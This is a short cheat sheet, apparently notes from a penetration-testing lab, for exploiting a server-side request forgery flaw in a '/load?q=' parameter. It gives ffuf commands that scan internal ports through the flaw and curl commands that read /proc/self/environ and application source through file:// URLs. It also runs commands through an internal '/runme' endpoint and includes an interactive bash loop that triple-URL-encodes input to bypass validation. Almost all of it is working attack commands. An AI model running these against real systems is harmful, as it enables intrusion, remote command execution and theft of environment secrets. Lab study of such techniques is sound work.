
Simple wordlist for port http enumeration:

```shell-session
$ for port in {1..65535};do echo $port >> ports.txt;done
```

Enumerate responses with FFuF
```shell-session
$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```

It may ask for some recursion to work: 
```shell-session
$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
```

Levraging some RCE/Source Code Disclosure: 

Environment/Current Dir
```shell-session
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
```

Source Code Disclosure:
```shell-session
$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
```

RCE:
```shell-session
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
```

Simple RCE script for input validation bypess with url encode:

```shell-session
$ function rce() {
while true; do
echo -n "# "; read cmd
ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
echo ""
done
}
```
